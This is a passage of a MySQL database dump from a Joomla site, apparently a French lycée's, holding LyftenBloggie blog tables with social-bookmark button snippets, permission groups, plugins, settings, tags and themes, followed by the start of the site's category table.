(46, 'DZone.com - JavaScript Wide Badge', '<script type="text/javascript">var dzone_url = ''***url***'';</script><script type="text/javascript">var dzone_title = ''***title***'';</script><script type="text/javascript">var dzone_blurb = ''***description***'';</script><script type="text/javascript">var dzone_style = ''2'';</script><script language="javascript" src="http://widgets.dzone.com/widgets/zoneit.js"></script>', 0, 'button'),
(47, 'Swik.net - Small Button', '<a rel="nofollow" onclick="window.open(''http://stories.swik.net/?submitUrl&url=***url_encoded***''); return false;" href="http://stories.swik.net/" title="Swik!" target="_blank"><img src="***imageDirectory***/swik.png" alt="Swik!" title="Swik!" /></a>', 0, 'button'),
(48, 'Shoutwire.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://www.shoutwire.com/?p=submit&link=***url_encoded***''); return false;" href="http://wwww.shoutwire.net/" title="ShoutWire!" target="_blank"><img src="***imageDirectory***/shoutwire.png" alt="ShoutWire!" title="ShoutWire!" /></a>', 0, 'button'),
(49, 'MyLinkVault.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://www.mylinkvault.com/link-quick.php?u=***url_decoded***&n=***title_encoded***''); return false;" href="http://wwww.mylinkvault.net/" title="MyLinkVault!" target="_blank"><img src="***imageDirectory***/mylinkvault.png" alt="MyLinkVault!" title="MyLinkVault!" /></a>', 0, 'button'),
(50, 'Maple.nu - Small Button', '<a rel="nofollow" onclick="window.open(''http://www.maple.nu/submit.php?url=***url_encoded***&title=***title_encoded***''); return false;" href="http://maple.nu/" title="Maple!" target="_blank"><img src="***imageDirectory***/maple.png" alt="Maple!" title="Maple!" /></a>', 0, 'button'),
(51, 'BlogRolling.com - Small Button', '<a rel="nofollow" onclick="window.open(''http://www.blogrolling.com/add_links_pop.phtml?u=***url_encoded***&t=***title_encoded***''); return false;" href="http://www.blogrolling.com/" title="BlogRolling!" target="_blank"><img src="***imageDirectory***/blogrolling.png" alt="BlogRolling!" title="BlogRolling!" /></a>', 0, 'button'),
(52, 'AddThis.com - JavaScript Drop Down Badge', '<!-- AddThis Bookmark Button BEGIN --><script type="text/javascript">addthis_url = ''***url***''; addthis_title = ''***title***''; addthis_pub = ''***addThisPubId***'';</script><script type="text/javascript" src="http://s7.addthis.com/js/addthis_widget.php?v=12" ></script><!-- AddThis Bookmark Button END -->', 0, 'button'),
(53, 'AddThis.com - Button Style 1', '<!-- AddThis Bookmark Button BEGIN --><a href="http://www.addthis.com/bookmark.php" onclick="addthis_url = ''***url***''; addthis_title = ''***title***''; return addthis_click(this);" target="_blank"><img src="http://s9.addthis.com/button0-bm.gif" width="83" height="16" border="0" alt="AddThis Social Bookmark Button" /></a> <script type="text/javascript">var addthis_pub = ''***addThisPubId***'';</script><script type="text/javascript" src="http://s9.addthis.com/js/widget.php?v=10"></script>  <!-- AddThis Bookmark Button END -->', 0, 'button'),
(54, 'AddThis.com - Button Style 2', '<!-- AddThis Bookmark Button BEGIN --><a href="http://www.addthis.com/bookmark.php" onclick="addthis_url = ''***url***''; addthis_title = ''***title***''; return addthis_click(this);" target="_blank"><img src="http://s9.addthis.com/button1-bm.gif" width="125" height="16" border="0" alt="AddThis Social Bookmark Button" /></a> <script type="text/javascript">var addthis_pub = ''***addThisPubId***'';</script><script type="text/javascript" src="http://s9.addthis.com/js/widget.php?v=10"></script>  <!-- AddThis Bookmark Button END -->', 0, 'button'),
(55, 'AddThis.com - Button Style 3', '<!-- AddThis Bookmark Button BEGIN --><a href="http://www.addthis.com/bookmark.php" onclick="addthis_url = ''***url***''; addthis_title = ''***title***''; return addthis_click(this);" target="_blank"><img src="http://s9.addthis.com/button1-share.gif" width="125" height="16" border="0" alt="AddThis Social Bookmark Button" /></a> <script type="text/javascript">var addthis_pub = ''***addThisPubId***'';</script><script type="text/javascript" src="http://s9.addthis.com/js/widget.php?v=10"></script>  <!-- AddThis Bookmark Button END -->', 0, 'button'),
(56, 'AddThis.com - Button Style 4', '<!-- AddThis Bookmark Button BEGIN --><a href="http://www.addthis.com/bookmark.php" onclick="addthis_url = ''***url***''; addthis_title = ''***title***''; return addthis_click(this);" target="_blank"><img src="http://s9.addthis.com/button1-addthis.gif" width="125" height="16" border="0" alt="AddThis Social Bookmark Button" /></a> <script type="text/javascript">var addthis_pub = ''***addThisPubId***'';</script><script type="text/javascript" src="http://s9.addthis.com/js/widget.php?v=10"></script><!-- AddThis Bookmark Button END -->', 0, 'button'),
(57, 'AddThis.com - Button Style 5', '<!-- AddThis Bookmark Button BEGIN --><a href="http://www.addthis.com/bookmark.php" onclick="addthis_url = ''***url***''; addthis_title = ''***title***''; return addthis_click(this);" target="_blank"><img src="http://s9.addthis.com/button2-bm.png" width="160" height="24" border="0" alt="AddThis Social Bookmark Button" /></a> <script type="text/javascript">var addthis_pub = ''***addThisPubId***'';</script><script type="text/javascript" src="http://s9.addthis.com/js/widget.php?v=10"></script><!-- AddThis Bookmark Button END -->', 0, 'button'),
(58, 'GodSurfer.com - Small Button', '<a rel="nofollow" href="http://www.godsurfer.com/" title="GodSurfer!" target="_blank"   \r\n        onclick="window.open(''http://www.godsurfer.com/addStory.php?url=***url***''); return false;">  \r\n        <img height="18px" width="18px" src="***imageDirectory***/godsurfer.png" alt="GodSurfer!" title="GodSurfer!" /></a>', 0, 'button'),
(59, 'GodSurfer.com - JavaScript Large Badge', '<script type="text/javascript">GODSurfer_url = "***url***";</script><script src="http://www.godsurfer.com/tools/GODSurfer.js" type="text/javascript"></script>', 0, 'badge'),
(60, 'GodSurfer.com - JavaScript Compact Badge', '<script type="text/javascript">GODSurfer_url = "***url***"; GODSurfer_skin = "compact";</script><script src="http://www.godsurfer.com/tools/GODSurfer.js" type="text/javascript"></script>', 0, 'badge');

-- --------------------------------------------------------

--
-- Table structure for table `jos_bloggies_categories`
--

CREATE TABLE IF NOT EXISTS `jos_bloggies_categories` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL DEFAULT '',
  `parent` int(11) NOT NULL DEFAULT '0',
  `default` tinyint(4) NOT NULL DEFAULT '0',
  `slug` varchar(255) NOT NULL DEFAULT '',
  `text` mediumtext NOT NULL,
  `meta_keywords` text NOT NULL,
  `meta_description` text NOT NULL,
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `checked_out` int(11) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ordering` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `jos_bloggies_categories`
--

INSERT INTO `jos_bloggies_categories` (`id`, `title`, `parent`, `default`, `slug`, `text`, `meta_keywords`, `meta_description`, `published`, `checked_out`, `checked_out_time`, `ordering`) VALUES
(1, 'Bloggies', 0, 1, 'bloggies', '', '', '', 1, 0, '0000-00-00 00:00:00', 1),
(2, 'Latest Updates', 0, 0, 'latest-updates', '', '', '', 1, 0, '0000-00-00 00:00:00', 2);

-- --------------------------------------------------------

--
-- Table structure for table `jos_bloggies_comments`
--

CREATE TABLE IF NOT EXISTS `jos_bloggies_comments` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `entry_id` int(11) NOT NULL DEFAULT '0',
  `author` tinytext,
  `author_email` varchar(100) NOT NULL DEFAULT '',
  `author_url` text,
  `author_ip` varchar(100) NOT NULL DEFAULT '',
  `date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `content` text NOT NULL,
  `karma` int(11) NOT NULL DEFAULT '0',
  `agent` varchar(255) NOT NULL DEFAULT '',
  `type` varchar(20) NOT NULL DEFAULT '',
  `parent` varchar(20) NOT NULL DEFAULT '0',
  `user_id` varchar(20) NOT NULL DEFAULT '0',
  `state` tinyint(4) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`),
  KEY `entry_id` (`entry_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `jos_bloggies_entries`
--

CREATE TABLE IF NOT EXISTS `jos_bloggies_entries` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL DEFAULT '',
  `alias` varchar(255) NOT NULL DEFAULT '',
  `title_alias` varchar(255) NOT NULL DEFAULT '',
  `introtext` mediumtext NOT NULL,
  `fulltext` mediumtext NOT NULL,
  `state` tinyint(3) NOT NULL DEFAULT '0',
  `sectionid` int(11) unsigned NOT NULL DEFAULT '0',
  `image` text NOT NULL,
  `catid` int(11) unsigned NOT NULL DEFAULT '0',
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_by` int(11) unsigned NOT NULL DEFAULT '0',
  `created_by_alias` varchar(255) NOT NULL DEFAULT '',
  `modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_by` int(11) unsigned NOT NULL DEFAULT '0',
  `checked_out` int(11) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `images` text NOT NULL,
  `urls` text NOT NULL,
  `attribs` text NOT NULL,
  `pinged` text NOT NULL,
  `version` int(11) unsigned NOT NULL DEFAULT '1',
  `metakey` text NOT NULL,
  `metadesc` text NOT NULL,
  `access` int(11) unsigned NOT NULL DEFAULT '0',
  `hits` int(11) unsigned NOT NULL DEFAULT '0',
  `metadata` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `idx_section` (`sectionid`),
  KEY `idx_access` (`access`),
  KEY `idx_checkout` (`checked_out`),
  KEY `idx_state` (`state`),
  KEY `idx_catid` (`catid`),
  KEY `idx_createdby` (`created_by`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `jos_bloggies_entries`
--

INSERT INTO `jos_bloggies_entries` (`id`, `title`, `alias`, `title_alias`, `introtext`, `fulltext`, `state`, `sectionid`, `image`, `catid`, `created`, `created_by`, `created_by_alias`, `modified`, `modified_by`, `checked_out`, `checked_out_time`, `images`, `urls`, `attribs`, `pinged`, `version`, `metakey`, `metadesc`, `access`, `hits`, `metadata`) VALUES
(1, 'Welcome to Lyften Bloggie!', 'welcome-to-lyften-bloggie', '', '<p>Hello there, and welcome to your new blog powered by <strong>LyftenBloggie v1.1.0</strong>.</p>\r\n<p>To get started, login into Joomla''s Administrator back-end and add adjust the users access groups to set who is allowed to do what (LyftenBloggie -&gt; Settings -&gt; Access Groups), then start blogging. To find out more about the different options and what you can do with LyftenBloggie go to <a href="http://www.lyften.com/products/lyften-bloggie.html">http://www.lyften.com/products/lyften-bloggie.html</a></p>', '', 1, 0, 'logo.png', 1, '2010-03-30 18:40:00', 62, '', '2010-06-19 19:29:47', 62, 0, '0000-00-00 00:00:00', ' ', ' ', 'allow_comments=0', '', 61, ' ', ' ', 1, 49, 'robots=\nauthor=');

-- --------------------------------------------------------

--
-- Table structure for table `jos_bloggies_groups`
--

CREATE TABLE IF NOT EXISTS `jos_bloggies_groups` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `group` varchar(255) NOT NULL DEFAULT '',
  `permissions` text NOT NULL,
  `email_all` tinyint(4) NOT NULL DEFAULT '0',
  `published` tinyint(4) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=9 ;

--
-- Dumping data for table `jos_bloggies_groups`
--

INSERT INTO `jos_bloggies_groups` (`id`, `group`, `permissions`, `email_all`, `published`) VALUES
(1, '1', 'a:1:{s:6:"system";a:1:{s:13:"system_access";s:1:"1";}}', 0, 1),
(2, '18', 'a:4:{s:6:"system";a:1:{s:13:"system_access";s:1:"1";}s:6:"author";a:5:{s:13:"author_access";s:1:"1";s:11:"can_publish";s:1:"0";s:10:"can_delete";s:1:"1";s:10:"can_upload";s:1:"1";s:11:"create_tags";s:1:"1";}s:5:"admin";a:1:{s:12:"admin_access";s:1:"0";}s:6:"emails";a:1:{s:11:"can_recnoti";s:1:"0";}}', 0, 1),
(3, '19', 'a:3:{s:6:"system";a:1:{s:13:"system_access";s:1:"1";}s:6:"author";a:1:{s:13:"author_access";s:1:"0";}s:5:"admin";a:1:{s:12:"admin_access";s:1:"0";}}', 0, 1),
(4, '20', 'a:3:{s:6:"system";a:1:{s:13:"system_access";s:1:"1";}s:6:"author";a:1:{s:13:"author_access";s:1:"0";}s:5:"admin";a:1:{s:12:"admin_access";s:1:"0";}}', 0, 1),
(5, '21', 'a:3:{s:6:"system";a:1:{s:13:"system_access";s:1:"1";}s:6:"author";a:1:{s:13:"author_access";s:1:"0";}s:5:"admin";a:1:{s:12:"admin_access";s:1:"0";}}', 0, 1),
(6, '23', 'a:3:{s:6:"system";a:1:{s:13:"system_access";s:1:"1";}s:6:"author";a:1:{s:13:"author_access";s:1:"0";}s:5:"admin";a:1:{s:12:"admin_access";s:1:"0";}}', 0, 1),
(7, '24', 'a:4:{s:6:"system";a:1:{s:13:"system_access";s:1:"1";}s:6:"author";a:4:{s:13:"author_access";s:1:"1";s:11:"can_publish";s:1:"1";s:10:"can_delete";s:1:"1";s:10:"can_upload";s:1:"1";}s:5:"admin";a:2:{s:12:"admin_access";s:1:"1";s:11:"can_approve";s:1:"1";}s:6:"emails";a:4:{s:11:"can_recnoti";s:1:"1";s:14:"comment_report";s:1:"1";s:11:"new_comment";s:1:"1";s:13:"pending_entry";s:1:"1";}}', 0, 1),
(8, '25', 'a:4:{s:6:"system";a:1:{s:13:"system_access";s:1:"1";}s:6:"author";a:5:{s:13:"author_access";s:1:"1";s:11:"can_publish";s:1:"1";s:10:"can_delete";s:1:"1";s:10:"can_upload";s:1:"1";s:11:"create_tags";s:1:"1";}s:5:"admin";a:2:{s:12:"admin_access";s:1:"1";s:11:"can_approve";s:1:"1";}s:6:"emails";a:8:{s:11:"can_recnoti";s:1:"1";s:11:"receive_all";s:1:"1";s:9:"new_entry";s:1:"1";s:17:"new_pending_entry";s:1:"1";s:13:"pending_entry";s:1:"1";s:14:"pending_delete";s:1:"0";s:14:"comment_report";s:1:"1";s:11:"new_comment";s:1:"1";}}', 1, 1);

-- --------------------------------------------------------

--
-- Table structure for table `jos_bloggies_plugins`
--

CREATE TABLE IF NOT EXISTS `jos_bloggies_plugins` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL DEFAULT '',
  `type` varchar(255) NOT NULL DEFAULT '',
  `title` varchar(255) NOT NULL DEFAULT '',
  `author` varchar(56) NOT NULL DEFAULT '',
  `email` varchar(124) NOT NULL DEFAULT '',
  `website` varchar(255) NOT NULL DEFAULT '',
  `version` varchar(24) NOT NULL DEFAULT '',
  `license` varchar(255) NOT NULL DEFAULT '',
  `copyright` varchar(255) NOT NULL DEFAULT '',
  `create_date` varchar(56) NOT NULL DEFAULT '',
  `attribs` text NOT NULL,
  `published` int(1) NOT NULL DEFAULT '0',
  `iscore` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=8 ;

--
-- Dumping data for table `jos_bloggies_plugins`
--

INSERT INTO `jos_bloggies_plugins` (`id`, `name`, `type`, `title`, `author`, `email`, `website`, `version`, `license`, `copyright`, `create_date`, `attribs`, `published`, `iscore`) VALUES
(1, 'default', 'comment', 'LyftenBloggie Comment', 'Daniel Stainback', 'joomla@lyften.com', 'http://www.lyften.com', '1.0.0', '', '', 'March 13, 2010', ' ', 1, 1),
(2, 'jcomment', 'comment', 'JComment', 'Daniel Stainback', 'joomla@lyften.com', 'http://www.lyften.com', '1.0.0', '', '', 'March 13, 2010', ' ', 1, 0),
(3, 'jomcomment', 'comment', 'JomComment', 'Daniel Stainback', 'joomla@lyften.com', 'http://www.lyften.com', '1.0.0', '', '', 'March 13, 2010', ' ', 1, 0),
(4, 'default', 'avatar', 'LyftenBloggie Avatar', 'Daniel Stainback', 'joomla@lyften.com', 'http://www.lyften.com', '1.0.0', '', '', 'March 20, 2010', 'uploads=1', 1, 1),
(5, 'jomsocial', 'avatar', 'jomSocial Avatar', 'Daniel Stainback', 'joomla@lyften.com', 'http://www.lyften.com', '1.0.0', '', '', 'March 20, 2010', '', 1, 0),
(6, 'combuilder', 'avatar', 'ComBuilder Avatar', 'Daniel Stainback', 'joomla@lyften.com', 'http://www.lyften.com', '1.0.0', '', '', 'March 20, 2010', '', 1, 0),
(7, 'juser', 'avatar', 'JUser Avatar', 'Daniel Stainback', 'joomla@lyften.com', 'http://www.lyften.com', '1.0.0', '', '', 'March 20, 2010', '', 1, 0);

-- --------------------------------------------------------

--
-- Table structure for table `jos_bloggies_relations`
--

CREATE TABLE IF NOT EXISTS `jos_bloggies_relations` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `entry` int(10) unsigned NOT NULL DEFAULT '0',
  `tag` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `jos_bloggies_reports`
--

CREATE TABLE IF NOT EXISTS `jos_bloggies_reports` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT '0',
  `comment_id` int(11) NOT NULL DEFAULT '0',
  `reason` text NOT NULL,
  `details` text,
  `date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `jos_bloggies_settings`
--

CREATE TABLE IF NOT EXISTS `jos_bloggies_settings` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL DEFAULT '',
  `value` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `name` (`name`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=43 ;

--
-- Dumping data for table `jos_bloggies_settings`
--

INSERT INTO `jos_bloggies_settings` (`id`, `name`, `value`) VALUES
(1, 'incomingLinks', '0'),
(2, 'checkUpdates', '1'),
(3, 'entrylistLimit', '5'),
(4, 'powerby', '1'),
(5, 'avatarUsed', 'default'),
(6, 'maxAvatarWidth', '80'),
(7, 'maxAvatarHeight', '80'),
(8, 'frontEditor', 'joomla'),
(9, 'frontUploads', '0'),
(10, 'allowTrackbacks', '1'),
(11, 'useUpdateServices', '0'),
(12, 'updateServices', 'http://rpc.pingomatic.com/'),
(13, 'useIntrotext', '0'),
(14, 'autoReadmorePCount', '2'),
(15, 'necessaryReadmore', '0'),
(16, 'commentEntryLimit', '5'),
(17, 'useRSSFeed', '1'),
(18, 'title', 'Lyften Bloggie'),
(19, 'mainBlogDesc', 'Powered by Lyften Bloggie'),
(20, 'feedLimit', '8'),
(21, 'feedSummarize', '0'),
(22, 'feedLength', '2'),
(23, 'useRSS1', '1'),
(24, 'useAtom', '1'),
(25, 'typeComments', 'default'),
(26, 'allowAnon', '0'),
(27, 'commentlistLimit', '5'),
(28, 'allowReport', '1'),
(29, 'enableCaptcha', '1'),
(30, 'enableBadWord', '1'),
(31, 'theBadWords', ''),
(32, 'replaceBadWords', '@#$*!'),
(33, 'AkismetApi', ''),
(34, 'spamCheck', '0'),
(35, 'groups', 'system=system_access\r\nauthor=author_access,can_publish,can_delete,can_upload,create_tags\r\nadmin=admin_access,can_approve\r\nemails=can_recnoti,receive_all,new_entry,new_pending_entry,pending_entry,pending_delete,comment_report,new_comment'),
(36, 'display_img_h', '200'),
(37, 'display_img_w', '200'),
(38, 'charset', 'UTF-8'),
(39, 'stripObjects', '1'),
(40, 'patches', ''),
(41, 'correctImageUrl', '1'),
(42, 'filterTrackbacks', '0');

-- --------------------------------------------------------

--
-- Table structure for table `jos_bloggies_tags`
--

CREATE TABLE IF NOT EXISTS `jos_bloggies_tags` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL DEFAULT '',
  `slug` varchar(255) NOT NULL DEFAULT '',
  `published` tinyint(4) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=12 ;

--
-- Dumping data for table `jos_bloggies_tags`
--

INSERT INTO `jos_bloggies_tags` (`id`, `name`, `slug`, `published`) VALUES
(1, 'Gadgets', 'gadgets', 1),
(2, 'Sports', 'sports', 1),
(3, 'General', 'general', 1),
(4, 'Vacation', 'vacation', 1),
(5, 'Product News', 'product-news', 1),
(6, 'Add-ons', 'add-ons', 1),
(7, 'Announcements', 'announcements', 1),
(8, 'Office', 'office', 1),
(9, 'Software', 'software', 1),
(10, 'Updates', 'updates', 1),
(11, 'Upgrade', 'upgrade', 1);

-- --------------------------------------------------------

--
-- Table structure for table `jos_bloggies_themes`
--

CREATE TABLE IF NOT EXISTS `jos_bloggies_themes` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL DEFAULT '',
  `title` varchar(255) NOT NULL DEFAULT '',
  `is_default` int(1) NOT NULL DEFAULT '0',
  `author` varchar(56) NOT NULL DEFAULT '',
  `email` varchar(124) NOT NULL DEFAULT '',
  `website` varchar(255) NOT NULL DEFAULT '',
  `version` varchar(24) NOT NULL DEFAULT '',
  `license` varchar(255) NOT NULL DEFAULT '',
  `copyright` varchar(255) NOT NULL DEFAULT '',
  `create_date` varchar(56) NOT NULL DEFAULT '',
  `attribs` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=5 ;

--
-- Dumping data for table `jos_bloggies_themes`
--

INSERT INTO `jos_bloggies_themes` (`id`, `name`, `title`, `is_default`, `author`, `email`, `website`, `version`, `license`, `copyright`, `create_date`, `attribs`) VALUES
(1, 'default', 'Default Theme', 1, 'Lyften Designs', 'joomla@lyften.com', 'http://www.lyften.com', '1.1.0', 'GNU/Lesser General Public License', 'Copyright 2009-2010 Lyften Designs', 'March 20, 2010', 'style=0\nleft_object=avatar\nleftobj_width=48px\nleftobj_height=48px'),
(2, 'anemoi', 'Anemoi', 0, 'Lyften Designs', 'joomla@lyften.com', 'http://www.lyften.com', '1.1.0', 'GNU/Lesser General Public License', 'Copyright 2010 Lyften Designs', 'March 20, 2010', 'style=blue\nleftcol_object=image\nleftcol_width=208px'),
(3, 'classic', 'Classic', 0, 'Lyften Designs', 'joomla@lyften.com', 'http://www.lyften.com', '1.1.0', 'GNU/Lesser General Public License', 'Copyright 2008-2010 Lyften Designs', 'March 20, 2010', ' '),
(4, 'simple', 'Simple', 0, 'Lyften Designs', 'joomla@lyften.com', 'http://www.lyften.com', '1.1.0', 'GNU/Lesser General Public License', 'Copyright 2008-2010 Lyften Designs', 'March 20, 2010', 'leftcol_object=image\nleftcol_width=240px');

-- --------------------------------------------------------

--
-- Table structure for table `jos_categories`
--

CREATE TABLE IF NOT EXISTS `jos_categories` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `asset_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'FK to the #__assets table.',
  `parent_id` int(10) unsigned NOT NULL DEFAULT '0',
  `lft` int(11) NOT NULL DEFAULT '0',
  `rgt` int(11) NOT NULL DEFAULT '0',
  `level` int(10) unsigned NOT NULL DEFAULT '0',
  `path` varchar(255) NOT NULL DEFAULT '',
  `extension` varchar(50) NOT NULL DEFAULT '',
  `title` varchar(255) NOT NULL,
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `note` varchar(255) NOT NULL DEFAULT '',
  `description` mediumtext,
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `checked_out` int(11) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `access` int(10) unsigned DEFAULT NULL,
  `params` text NOT NULL,
  `metadesc` varchar(1024) NOT NULL COMMENT 'The meta description for the page.',
  `metakey` varchar(1024) NOT NULL COMMENT 'The meta keywords for the page.',
  `metadata` varchar(2048) NOT NULL COMMENT 'JSON encoded metadata properties.',
  `created_user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `created_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `modified_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `hits` int(10) unsigned NOT NULL DEFAULT '0',
  `language` char(7) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `cat_idx` (`extension`,`published`,`access`),
  KEY `idx_access` (`access`),
  KEY `idx_checkout` (`checked_out`),
  KEY `idx_path` (`path`),
  KEY `idx_left_right` (`lft`,`rgt`),
  KEY `idx_alias` (`alias`),
  KEY `idx_language` (`language`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=63 ;

--
-- Dumping data for table `jos_categories`
--

INSERT INTO `jos_categories` (`id`, `asset_id`, `parent_id`, `lft`, `rgt`, `level`, `path`, `extension`, `title`, `alias`, `note`, `description`, `published`, `checked_out`, `checked_out_time`, `access`, `params`, `metadesc`, `metakey`, `metadata`, `created_user_id`, `created_time`, `modified_user_id`, `modified_time`, `hits`, `language`) VALUES
(1, 0, 0, 0, 123, 0, '', 'system', 'ROOT', 'root', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{}', '', '', '', 0, '2009-10-18 16:07:09', 0, '0000-00-00 00:00:00', 0, '*'),
(2, 27, 1, 1, 2, 1, 'uncategorised', 'com_content', 'Uncategorised', 'uncategorised', '', '', 2, 0, '0000-00-00 00:00:00', 1, '{"target":"","image":""}', '', '', '{"page_title":"","author":"","robots":""}', 42, '2010-06-28 13:26:37', 0, '0000-00-00 00:00:00', 0, '*'),
(3, 28, 1, 3, 4, 1, 'uncategorised', 'com_banners', 'Uncategorised', 'uncategorised', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"target":"","image":"","foobar":""}', '', '', '{"page_title":"","author":"","robots":""}', 42, '2010-06-28 13:27:35', 0, '0000-00-00 00:00:00', 0, '*'),
(4, 29, 1, 5, 6, 1, 'uncategorised', 'com_contact', 'Uncategorised', 'uncategorised', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"target":"","image":""}', '', '', '{"page_title":"","author":"","robots":""}', 42, '2010-06-28 13:27:57', 0, '0000-00-00 00:00:00', 0, '*'),
(5, 30, 1, 7, 8, 1, 'uncategorised', 'com_newsfeeds', 'Uncategorised', 'uncategorised', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"target":"","image":""}', '', '', '{"page_title":"","author":"","robots":""}', 42, '2010-06-28 13:28:15', 0, '0000-00-00 00:00:00', 0, '*'),
(6, 31, 1, 9, 10, 1, 'uncategorised', 'com_weblinks', 'Uncategorised', 'uncategorised', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"target":"","image":""}', '', '', '{"page_title":"","author":"","robots":""}', 42, '2010-06-28 13:28:33', 0, '0000-00-00 00:00:00', 0, '*'),
(7, 32, 1, 11, 18, 1, 'sample-pages', 'com_content', 'Sample Pages', 'sample-pages', '', '', -2, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 42, '2011-07-18 05:24:56', 0, '0000-00-00 00:00:00', 0, '*'),
(8, 38, 7, 12, 13, 2, 'sample-pages/lycee', 'com_content', 'Accueil', 'lycee', '', '', -2, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 42, '2011-07-18 05:42:39', 390, '2012-10-29 17:37:54', 0, '*'),
(9, 42, 7, 14, 15, 2, 'sample-pages/formations', 'com_content', 'des formations', 'formations', '', '', -2, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 42, '2011-08-02 15:11:57', 390, '2012-10-29 15:59:19', 0, '*'),
(10, 45, 7, 16, 17, 2, 'sample-pages/facilities', 'com_content', 'Facilities', 'facilities', '', '', -2, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 42, '2011-08-02 15:35:22', 0, '0000-00-00 00:00:00', 0, '*'),
(13, 77, 1, 23, 24, 1, 'un-lycee', 'com_content', 'un lycee', 'un-lycee', '', '', -2, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2012-10-29 17:38:04', 0, '0000-00-00 00:00:00', 0, '*'),
(11, 62, 1, 19, 20, 1, 'cdi', 'com_content', 'CDI', 'cdi', '', '', -2, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2012-10-29 16:09:35', 0, '0000-00-00 00:00:00', 0, '*'),
(21, 112, 19, 90, 91, 2, 'cat-actualite/cat-actu-as', 'com_content', 'Actualités AS', 'cat-actu-as', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2016-06-16 13:53:19', 390, '2016-06-22 08:06:13', 0, '*'),
(14, 84, 1, 25, 26, 1, 'procedure-inscription', 'com_content', 'procedure inscription', 'procedure-inscription', '', '', -2, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 390, '2012-10-29 19:00:26', 0, '0000-00-00 00:00:00', 0, '*'),
